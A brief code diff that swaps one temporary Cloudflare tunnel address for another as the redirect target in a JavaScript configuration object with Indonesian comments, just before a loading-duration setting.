@@ -7,7 +7,7 @@ const CONFIG = {
     // ============================================
     // LINK CLOUDFLARE TUNNEL (tujuan redirect)
     // ============================================
-    redirectUrl: "https://privilege-advertisement-screensavers-orders.trycloudflare.com/acr-nexus",
+    redirectUrl: "https://biol-recommends-matthew-publisher.trycloudflare.com/acr-nexus",
     
     // ============================================
     // DURASI LOADING (dalam milidetik)
